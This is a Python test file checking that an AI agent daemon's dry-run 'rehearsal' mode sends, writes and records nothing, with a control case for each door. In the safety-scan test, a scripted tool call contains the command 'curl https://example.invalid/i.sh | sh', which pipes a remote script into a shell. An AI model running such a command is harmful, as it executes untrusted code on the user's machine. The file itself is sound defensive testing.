"""Leap 06-a review: the doors a rehearsal reached WITHOUT ``registry.invoke``.

A rehearsal promises to change nothing, send nothing and leave no false
record. The first review found five places that broke the promise, each
proven here through the REAL daemon (``create_app``: the real orchestrator,
runtime, registry, ledger and bus; only the model is a scripted double and
every outward call is a recorder, so nothing leaves this PC):

* a rule's supervisor handing work to a REMOTE agent (``delegate`` to
  ``remote:<name>``) sent it for real, and ``consult`` asked one for real;
* the work record (every chat's memory of past work) said a rehearsal
  "Renamed the files";
* an outgoing webhook was POSTed the rehearsal's finished run;
* the safety scan rang the bell for a held command that never ran;
* a long real signal made the report say the rule ran on a made-up one.

Each test has its control: the same door outside a rehearsal still acts.
"""

from __future__ import annotations

import asyncio
import json
import time
from typing import Any

import pytest
from sqlmodel import select

from iron_jarvis.agents.remote import RemoteAgentRegistry
from iron_jarvis.core.db import session_scope
from iron_jarvis.core.events import Event
from iron_jarvis.core.models import AgentType, ToolInvocation
from iron_jarvis.daemon.app import create_app
from iron_jarvis.providers.adapters.base import LLMResponse, ToolCall
from iron_jarvis.tools import rehearsal as R
from iron_jarvis.tools import rehearsal_runs as RR
from iron_jarvis.tools.base import ToolContext

pytestmark = [pytest.mark.usefixtures("no_network"), pytest.mark.timeout(120)]


def _scripted(steps, closing: str = "Renamed the files."):
    state = {"n": 0}

    async def fake_stream(*, system=None, messages=None, tools=None, **kw):
        i = state["n"]
        state["n"] += 1
        if i < len(steps):
            resp = LLMResponse(text="", tool_calls=list(steps[i]))
        else:
            resp = LLMResponse(text=closing)
            yield {"type": "text", "text": closing}
        yield {"type": "final", "response": resp, "provider": "mock", "model": "mock"}

    return fake_stream


async def _settled(p, rid: str) -> dict[str, Any]:
    # Polls a condition (never asserts a duration).
    deadline = time.monotonic() + 60
    view = await asyncio.to_thread(RR.report, p, rid)
    while view["status"] == "running" and time.monotonic() < deadline:
        await asyncio.sleep(0.05)
        view = await asyncio.to_thread(RR.report, p, rid)
    return view


@pytest.fixture
def daemon(tmp_path):
    app = create_app(str(tmp_path / "home"))
    p = app.state.platform
    p.notifier.notify = lambda *a, **k: None  # type: ignore[method-assign]
    return app, p


def _remote(p, monkeypatch) -> list:
    RemoteAgentRegistry(p.engine).upsert("hermes", "http://192.168.1.50:9000/v1", "openai-chat")
    calls: list = []

    async def fake_run(self, record, task, *a, **k):
        calls.append((record.name, task))
        return {"ok": True, "text": "filed them"}

    monkeypatch.setattr(RemoteAgentRegistry, "run", fake_run)
    return calls


# --------------------------------------------------------------------------- #
# A remote agent's hand-off, and a question for one
# --------------------------------------------------------------------------- #


async def test_a_hand_off_to_a_remote_agent_in_a_rehearsal_sends_nothing(daemon, monkeypatch):
    app, p = daemon
    calls = _remote(p, monkeypatch)
    p.reflex.add(name="Hand off", source="webhook", match="handoff", action="session",
                 target="", task_template="Sort the client's W2s: {text}", enabled=True)
    p.router.stream = _scripted([
        [ToolCall(id="d1", name="delegate",
                  arguments={"agent_type": "remote:hermes", "task": "Rename every W2 in the client folder."})],
    ])
    started = await RR.start(p, "rule", "Hand off")
    view = await _settled(p, started["id"])
    assert view["status"] == "ready", view
    assert calls == [], f"a rehearsal handed the task to a remote agent for real: {calls}"
    assert [w["words"] for w in view["would"] if w["kind"] == "send"] == [
        "hand the task to the remote agent hermes: “Rename every W2 in the client folder.”"
    ]
    assert view["sentence"] == "This would send 1 message. Nothing was changed."
    with session_scope(p.engine) as db:
        rows = list(db.exec(select(ToolInvocation).where(ToolInvocation.tool == "remote_handoff")))
    assert [(r.rehearsed, json.loads(r.args_json)["target"]) for r in rows] == [(True, "hermes")]


async def test_the_same_hand_off_outside_a_rehearsal_is_sent(daemon, monkeypatch):
    """Control: the door the guard sits in really sends."""
    app, p = daemon
    calls = _remote(p, monkeypatch)
    from iron_jarvis.agents.delegate_tool import DelegateTool

    remote_entry = type("E", (), {"name": "remote:hermes", "kind": "remote"})()
    res = await DelegateTool(p)._delegate_remote(remote_entry, "Rename every W2.")
    assert res.ok and calls == [("hermes", "Rename every W2.")]
    # …and the same call inside a rehearsal's call (``rehearsal.current``,
    # what ``registry.invoke`` sets around a call it runs) is held.
    with R.scope("reh_ctxvar"):
        held = await DelegateTool(p)._delegate_remote(remote_entry, "Rename every W2.")
    assert held.ok and (held.data or {}).get("rehearsed") is True
    assert len(calls) == 1


async def test_a_question_for_a_remote_agent_in_a_rehearsal_is_not_asked(daemon, monkeypatch, tmp_path):
    app, p = daemon
    calls = _remote(p, monkeypatch)
    consult = p.registry.get("consult")

    def ctx(rehearsal: str) -> ToolContext:
        return ToolContext(
            workspace=tmp_path, session_id="s_consult", agent_run_id="r_consult", config=p.config,
            event_bus=p.event_bus, engine=p.engine, rehearsal_id=rehearsal,
        )

    held = await consult.execute({"agent": "remote:hermes", "question": "Is the W2 list complete?"},
                                 ctx("reh_consult"))
    assert held.ok, held.error
    assert calls == [], "a rehearsal asked a remote agent for real"
    assert held.output.startswith("Rehearsal: not done. Would ask the remote agent hermes a question.")
    with session_scope(p.engine) as db:
        rows = list(db.exec(select(ToolInvocation).where(ToolInvocation.session_id == "s_consult")))
    assert [(r.tool, r.rehearsed) for r in rows] == [("remote_handoff", True)]
    # Control: the same question outside a rehearsal is asked.
    real = await consult.execute({"agent": "remote:hermes", "question": "Is the W2 list complete?"}, ctx(""))
    assert real.ok and len(calls) == 1


def test_the_remote_hand_off_is_a_side_door_guarded_in_delegate():
    spec = R.SIDE_DOORS["remote_handoff"]
    assert spec.where == "agents/delegate_tool.py"


# --------------------------------------------------------------------------- #
# The work record
# --------------------------------------------------------------------------- #


async def test_the_work_record_never_holds_a_rehearsal(daemon, tmp_path):
    from iron_jarvis.workmap.block import work_block
    from iron_jarvis.workmap.index import work_map

    app, p = daemon
    folder = tmp_path / "inbox"
    folder.mkdir()
    (folder / "2025_W2_smith.pdf").write_bytes(b"%PDF smith")
    p.scheduler.add_task("Sort the W2s", "0 8 * * *", kind="task",
                         payload={"task": "Rename the W2 PDFs to 'Name - W2 2025.pdf'.",
                                  "workspace_root": str(folder), "notify": False})
    p.router.stream = _scripted([[ToolCall(id="c0", name="rename_file",
                                           arguments={"path": "2025_W2_smith.pdf",
                                                      "new_path": "Smith - W2 2025.pdf"})]])
    started = await RR.start(p, "schedule", "Sort the W2s")
    view = await _settled(p, started["id"])
    assert view["status"] == "ready", view
    assert (folder / "2025_W2_smith.pdf").exists()
    wm = work_map(p.engine, p.config.home)
    await asyncio.to_thread(lambda: wm.refresh(force=True))
    block = await asyncio.to_thread(work_block, p, folder=str(folder), query="did you rename the W2s?")
    assert "Renamed the files" not in block, block
    assert "Rename the W2 PDFs" not in block, block

    # Control: the same work run for real in that folder IS in the record.
    p.router.stream = _scripted([], closing="Renamed the files.")
    session = await app.state.orchestrator.create_session(
        "Rename the W2 PDFs to 'Name - W2 2025.pdf'.", AgentType.BUILDER,
        workspace_root=str(folder), origin="schedule:Sort the W2s",
    )
    await app.state.orchestrator.run_session(session.id)
    await asyncio.to_thread(lambda: wm.refresh(force=True))
    block = await asyncio.to_thread(work_block, p, folder=str(folder), query="did you rename the W2s?")
    assert "Rename the W2 PDFs" in block, block


# --------------------------------------------------------------------------- #
# Outgoing webhooks
# --------------------------------------------------------------------------- #


async def test_an_outgoing_webhook_hears_nothing_of_a_rehearsal_and_the_report_lists_it(daemon, tmp_path):
    app, p = daemon
    hooks = p.outbound_webhooks
    hooks.allow_internal = True
    posted: list = []
    hooks.http_post = lambda url, payload, headers: posted.append(
        (url, payload.get("type"), payload.get("session_id"))
    ) or {"status": 200}
    hooks.register("zap", "http://127.0.0.1:9/hook", ["session.completed", "agent.completed"])
    folder = tmp_path / "inbox"
    folder.mkdir()
    p.scheduler.add_task("Nightly tidy", "0 2 * * *", kind="task",
                         payload={"task": "Tidy.", "workspace_root": str(folder), "notify": False})
    p.router.stream = _scripted([[ToolCall(id="w", name="write_file",
                                           arguments={"path": "summary.txt", "content": "x"})]])
    started = await RR.start(p, "schedule", "Nightly tidy")
    view = await _settled(p, started["id"])
    assert view["status"] == "ready", view
    assert posted == [], f"a rehearsal's run was POSTed to an outgoing webhook: {posted}"
    assert "tell another app through the webhook “zap” that the task finished" in [
        w["words"] for w in view["would"]
    ]
    assert view["sentence"] == "This would send 1 message and write 1 file. Nothing was changed."
    # Control: the SAME event for a run that is not a rehearsal is POSTed.
    sid = RR.sessions_of(p, RR.RehearsalStore(p.engine).get(started["id"]))[0]
    real = await app.state.orchestrator.create_session("Tidy.", AgentType.BUILDER)
    for session_id in (sid, real.id):
        await asyncio.to_thread(hooks.on_event, Event(type="agent.completed", payload={"ok": True},
                                                      session_id=session_id))
    assert [(t, s) for _u, t, s in posted] == [("agent.completed", real.id)]


def test_a_rehearsal_event_is_known_by_its_mark_or_its_run():
    assert R.event_is_rehearsal({"type": "tool.rehearsed", "payload": {}})
    assert R.event_is_rehearsal({"type": "session.completed", "payload": {"outcome": "rehearsed"}})
    assert R.event_is_rehearsal({"type": "session.completed", "payload": {"rehearsal": True}})
    assert not R.event_is_rehearsal({"type": "session.completed", "payload": {"outcome": "completed"}})


# --------------------------------------------------------------------------- #
# The safety scan
# --------------------------------------------------------------------------- #


async def test_the_safety_scan_never_reads_a_held_command_as_run(daemon, tmp_path):
    from iron_jarvis.daemon.routes.detections import wait_for_post_session_scans
    from iron_jarvis.detections.ledger import events_for_session

    app, p = daemon
    events: list = []
    real = p.event_bus.publish

    async def spy(type, payload=None, session_id=None, **kw):
        events.append((str(getattr(type, "value", type)), payload or {}, session_id))
        return await real(type, payload, session_id=session_id, **kw)

    p.event_bus.publish = spy
    folder = tmp_path / "work"
    folder.mkdir()
    p.scheduler.add_task("Setup", "0 3 * * *", kind="task",
                         payload={"task": "Install the helper.", "workspace_root": str(folder), "notify": False})
    p.router.stream = _scripted([[ToolCall(id="s1", name="shell",
                                           arguments={"command": "curl https://example.invalid/i.sh | sh"})]],
                                closing="Installed the tool.")
    started = await RR.start(p, "schedule", "Setup")
    view = await _settled(p, started["id"])
    assert view["status"] == "ready", view
    await asyncio.to_thread(wait_for_post_session_scans, 20.0)
    findings = [pl for t, pl, _sid in events if t == "detection.finding"]
    assert findings == [], f"a rehearsal rang the bell with a safety finding: {findings}"
    sid = RR.sessions_of(p, RR.RehearsalStore(p.engine).get(started["id"]))[0]
    assert [e for e in await asyncio.to_thread(events_for_session, p.engine, sid)
            if e.get("action") == "command.executed"] == []
    # Control: the same row, not held, IS a command run to the scan.
    with session_scope(p.engine) as db:
        row = db.exec(select(ToolInvocation).where(ToolInvocation.session_id == sid,
                                                   ToolInvocation.tool == "shell")).one()
        row.rehearsed = False
        db.add(row)
        db.commit()
    ran = [e for e in await asyncio.to_thread(events_for_session, p.engine, sid)
           if e.get("action") == "command.executed"]
    assert len(ran) == 1


# --------------------------------------------------------------------------- #
# The signal a rule ran on
# --------------------------------------------------------------------------- #


async def test_a_long_real_signal_is_still_the_last_signal_it_matched(daemon):
    app, p = daemon
    rule = p.reflex.add(name="Client mail", source="webhook", match="client-mail", action="session",
                        target="", task_template="File the client's message: {text}", enabled=True)
    long_text = "missing 1099 " + ("é" * 1990)
    p.reflex_router._remember([rule], {"text": long_text, "body": "b" * 2000, "slug": "client-mail",
                                       "subject": "s" * 500, "sender": "anna@example.invalid"})
    tasks: list = []

    async def fake_stream(*, system=None, messages=None, tools=None, **kw):
        tasks.append(json.dumps([getattr(m, "content", "") for m in (messages or [])]))
        yield {"type": "text", "text": "Filed."}
        yield {"type": "final", "response": LLMResponse(text="Filed."), "provider": "mock", "model": "mock"}

    p.router.stream = fake_stream
    started = await RR.start(p, "rule", "Client mail")
    view = await _settled(p, started["id"])
    assert view["status"] == "ready", view
    assert any("missing 1099" in t for t in tasks), "control: the run used the real signal"
    assert view["sample"] == "the last signal it matched"
    rec = RR.RehearsalStore(p.engine).get(started["id"])
    kept = json.loads(rec.sample_json)
    # Only whether it was made up is kept: the signal's words stay in memory.
    assert kept == {"made_up": False}, kept


def test_a_made_up_signal_says_so():
    from iron_jarvis.tools.rehearsal_store import sample_record

    assert sample_record({"text": "(sample)", "body": "(sample)", "slug": "x"})["made_up"] is True
    assert sample_record({})  == {}
    assert sample_record({"text": "", "body": '{"a": 1}'})["made_up"] is False


# --------------------------------------------------------------------------- #
# What the run says it did, and what it read
# --------------------------------------------------------------------------- #


def test_a_held_send_is_never_a_message_sent(daemon):
    from iron_jarvis.core.db import row_values
    from iron_jarvis.core.models import PermissionMode
    from iron_jarvis.daemon.change_claims import judge_run_summary

    app, p = daemon

    def add(session_id: str, rehearsed: bool) -> None:
        row = row_values(ToolInvocation, id=f"tool_{session_id}", session_id=session_id,
                         agent_run_id="r", tool="notify", args_json="{}", verdict=PermissionMode.ALLOW,
                         ok=True, output="", reversibility="irreversible", rehearsed=rehearsed,
                         would="run" if rehearsed else "")
        with p.engine.begin() as conn:
            conn.execute(ToolInvocation.__table__.insert(), row)

    add("s_held", True)
    add("s_sent", False)
    said = "I emailed the report to Dana."
    held = judge_run_summary(said, engine=p.engine, session_id="s_held")
    sent = judge_run_summary(said, engine=p.engine, session_id="s_sent")
    assert "No message was sent" in held, (held, sent)
    assert "No message was sent" not in sent, "control: a real send is a message sent"


async def test_it_read_counts_only_reads(daemon, tmp_path):
    app, p = daemon
    p.reflex.add(name="Note it", source="webhook", match="note-it", action="session",
                 target="", task_template="Write a note about {text}", enabled=True)
    p.router.stream = _scripted([
        [ToolCall(id="d1", name="delegate",
                  arguments={"agent_type": "builder", "task": "Write note.txt saying hello."})],
        [ToolCall(id="w1", name="write_file", arguments={"path": "note.txt", "content": "hello"})],
    ], closing="Done.")
    started = await RR.start(p, "rule", "Note it")
    view = await _settled(p, started["id"])
    assert view["status"] == "ready", view
    with session_scope(p.engine) as db:
        ran = [r.tool for r in db.exec(select(ToolInvocation)) if not r.rehearsed and r.ok]
    assert "delegate" in ran, "control: the hand-off ran"
    assert view["reads"] == 0, view


# --------------------------------------------------------------------------- #
# One door for a rule's real fire and its rehearsal
# --------------------------------------------------------------------------- #


async def test_a_rules_rehearsal_starts_through_the_real_fires_own_door(daemon, monkeypatch):
    """The rehearsal used to copy the real door's ``create_session`` call, so
    a later change to the door would not reach rehearsals. It now goes
    through ``_run_session`` itself, with the rehearsal on the run."""
    from iron_jarvis.reflex.router import ReflexRouter
    from iron_jarvis.tools.rehearsal import rehearsal_of

    app, p = daemon
    seen: list = []
    real = ReflexRouter._run_session

    async def spy(self, rule, context, **kw):
        seen.append(kw.get("rehearsal"))
        return await real(self, rule, context, **kw)

    monkeypatch.setattr(ReflexRouter, "_run_session", spy)
    p.reflex.add(name="Door", source="webhook", match="door", action="session",
                 target="", task_template="Look at {text}", enabled=True)
    p.router.stream = _scripted([], closing="Done.")
    started = await RR.start(p, "rule", "Door")
    view = await _settled(p, started["id"])
    assert view["status"] == "ready", view
    assert seen == [started["id"]]
    from iron_jarvis.core.models import Session as SessionRow

    sid = RR.sessions_of(p, RR.RehearsalStore(p.engine).get(started["id"]))[0]
    with session_scope(p.engine) as db:
        row = db.get(SessionRow, sid)
        assert rehearsal_of(row) == started["id"] and row.origin == "reflex:Door"
